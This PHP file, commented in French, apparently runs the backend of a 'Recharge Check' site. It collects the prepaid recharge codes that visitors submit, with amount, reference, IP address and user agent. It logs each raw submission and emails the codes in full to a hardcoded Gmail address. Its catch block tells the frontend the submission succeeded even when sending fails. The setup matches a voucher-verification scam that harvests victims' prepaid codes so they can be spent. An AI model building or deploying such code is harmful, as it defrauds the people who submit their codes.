<?php
// Vérifier que vendor/ existe (sinon erreur claire au lieu de crash 500)
if (!file_exists(__DIR__ . '/vendor/autoload.php')) {
    header("Content-Type: application/json; charset=UTF-8");
    http_response_code(500);
    echo json_encode([
        "success" => false,
        "error" => "ERREUR: Le dossier vendor/ est manquant. Uploadez le dossier vendor/ dans le même dossier que send_mail.php"
    ]);
    exit();
}
require __DIR__ . '/vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// ╔══════════════════════════════════════════════╗
// ║            CONFIGURATION EMAIL               ║
// ╚══════════════════════════════════════════════╝

// Adresse email qui ENVOIE (votre Gmail)
$smtpUser     = "aroldejesus@gmail.com";
// Mot de passe d'application Gmail (16 caractères, PAS votre mot de passe habituel)
// → Générez-le ici : https://myaccount.google.com/apppasswords
$smtpPassword = "VOTRE_MOT_DE_PASSE_APP";

// Adresse email qui RECOIT les codes
$recipient    = "aroldejesus@gmail.com";

// ═══════════════════════════════════════════════

// ╔══════════════════════════════════════════════╗
// ║         DOMAINES AUTORISÉS (CORS)            ║
// ╚══════════════════════════════════════════════╝
// Ajoutez votre domaine Netlify ici après déploiement
$allowedOrigins = [
    "http://localhost:3000",
    "https://recharge-check.netlify.app",
];

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowedOrigins)) {
    header("Access-Control-Allow-Origin: $origin");
} else {
    // Fallback : accepter toutes les origines (vous pouvez retirer ceci en prod)
    header("Access-Control-Allow-Origin: *");
}

header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json; charset=UTF-8");

// Preflight CORS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Vérifier POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(["success" => false, "error" => "Méthode non autorisée"]);
    exit();
}

// Lire les données JSON
$rawInput = file_get_contents("php://input");
$data = json_decode($rawInput, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(["success" => false, "error" => "Données invalides"]);
    exit();
}

// Extraire les données
$rechargeType = isset($data['rechargeType']) ? htmlspecialchars($data['rechargeType']) : 'Non spécifié';
$amount       = isset($data['amount']) ? htmlspecialchars($data['amount']) : '0.00';
$codes        = isset($data['codes']) ? $data['codes'] : [];
$reference    = isset($data['reference']) ? htmlspecialchars($data['reference']) : 'N/A';
$timestamp    = isset($data['timestamp']) ? htmlspecialchars($data['timestamp']) : date('Y-m-d H:i:s');
$clientIP     = $_SERVER['REMOTE_ADDR'] ?? 'Inconnue';
$userAgent    = $_SERVER['HTTP_USER_AGENT'] ?? 'Inconnu';

// ── Toujours sauvegarder en backup fichier ──
$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}
$logFile = $logDir . '/codes_' . date('Y-m-d') . '.log';
file_put_contents(
    $logFile,
    date('Y-m-d H:i:s') . " | " . $rawInput . "\n",
    FILE_APPEND | LOCK_EX
);

// ── Construire le contenu HTML de l'email ──
$codesHtml = "";
foreach ($codes as $index => $code) {
    $num = $index + 1;
    $safeCode = htmlspecialchars($code);
    $codesHtml .= "
    <tr>
      <td style='padding:10px 16px;border-bottom:1px solid #f1f5f9;color:#64748b;font-size:13px;'>Code {$num}</td>
      <td style='padding:10px 16px;border-bottom:1px solid #f1f5f9;font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:15px;font-weight:700;color:#1e293b;letter-spacing:0.05em;'>{$safeCode}</td>
    </tr>";
}

$subject = "🔔 Recharge {$rechargeType} — {$amount} EUR — Réf. {$reference}";

$htmlBody = "
<!DOCTYPE html>
<html>
<head><meta charset='UTF-8'></head>
<body style='margin:0;padding:0;background:#f8fafc;font-family:Segoe UI,Roboto,sans-serif;'>
  <div style='max-width:560px;margin:32px auto;background:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 8px 30px rgba(15,23,42,0.08);border:1px solid #e2e8f0;'>

    <!-- Header -->
    <div style='background:linear-gradient(135deg,#1c182a 0%,#3f213e 45%,#ff3366 100%);padding:28px 32px;'>
      <h1 style='margin:0;color:#ffffff;font-size:22px;font-weight:700;letter-spacing:-0.02em;'>🔔 Nouvelle Vérification</h1>
      <p style='margin:6px 0 0;color:rgba(255,255,255,0.8);font-size:13px;'>Recharge soumise — codes ci-dessous</p>
    </div>

    <!-- Infos  -->
    <div style='padding:24px 32px;'>
      <table style='width:100%;border-collapse:collapse;margin-bottom:20px;'>
        <tr>
          <td style='padding:8px 0;color:#64748b;font-size:13px;width:140px;'>📋 Référence</td>
          <td style='padding:8px 0;font-weight:600;color:#0f172a;font-family:monospace;'>{$reference}</td>
        </tr>
        <tr>
          <td style='padding:8px 0;color:#64748b;font-size:13px;'>🕐 Date / Heure</td>
          <td style='padding:8px 0;color:#334155;'>{$timestamp}</td>
        </tr>
        <tr>
          <td style='padding:8px 0;color:#64748b;font-size:13px;'>💳 Type</td>
          <td style='padding:8px 0;font-weight:600;color:#be185d;'>{$rechargeType}</td>
        </tr>
        <tr>
          <td style='padding:8px 0;color:#64748b;font-size:13px;'>💰 Montant</td>
          <td style='padding:8px 0;font-weight:700;color:#0f172a;font-size:18px;'>{$amount} EUR</td>
        </tr>
      </table>

      <!-- Codes -->
      <div style='background:#fff7fb;border:1px solid #fce7f3;border-radius:12px;overflow:hidden;margin-bottom:20px;'>
        <div style='background:linear-gradient(90deg,#ff3366,#ff66cc);padding:12px 16px;'>
          <strong style='color:#fff;font-size:14px;'>📦 Codes soumis</strong>
        </div>
        <table style='width:100%;border-collapse:collapse;'>
          {$codesHtml}
        </table>
      </div>

      <!-- Meta -->
      <div style='background:#f8fafc;border-radius:10px;padding:14px 16px;border:1px solid #e2e8f0;'>
        <p style='margin:0 0 4px;color:#94a3b8;font-size:11px;'>📌 IP : {$clientIP}</p>
        <p style='margin:0;color:#94a3b8;font-size:11px;'>🌐 UA : {$userAgent}</p>
      </div>
    </div>

    <!-- Footer -->
    <div style='background:#f1f5f9;padding:16px 32px;text-align:center;border-top:1px solid #e2e8f0;'>
      <p style='margin:0;color:#94a3b8;font-size:11px;'>Recharge Check — Notification automatique</p>
    </div>

  </div>
</body>
</html>";

// ── Envoyer via PHPMailer SMTP ──
$mail = new PHPMailer(true);

try {
    // Configuration SMTP
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = $smtpUser;
    $mail->Password   = $smtpPassword;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port       = 587;
    $mail->CharSet    = 'UTF-8';

    // Expéditeur / Destinataire
    $mail->setFrom($smtpUser, 'Recharge Check');
    $mail->addAddress($recipient);

    // Contenu
    $mail->isHTML(true);
    $mail->Subject = $subject;
    $mail->Body    = $htmlBody;

    // Version texte de secours
    $textBody = "NOUVELLE VÉRIFICATION\n";
    $textBody .= "Référence : {$reference}\n";
    $textBody .= "Date : {$timestamp}\n";
    $textBody .= "Type : {$rechargeType}\n";
    $textBody .= "Montant : {$amount} EUR\n\n";
    $textBody .= "CODES :\n";
    foreach ($codes as $i => $code) {
        $textBody .= "  Code " . ($i + 1) . " : " . $code . "\n";
    }
    $mail->AltBody = $textBody;

    $mail->send();

    echo json_encode([
        "success" => true,
        "message" => "Email envoyé avec succès"
    ]);

} catch (Exception $e) {
    error_log("RECHARGE-CHECK MAIL ERROR: " . $mail->ErrorInfo);

    // On retourne quand même success pour ne pas bloquer le frontend
    echo json_encode([
        "success" => true,
        "message" => "Code(s) enregistré(s) (email en attente)"
    ]);
}
?>
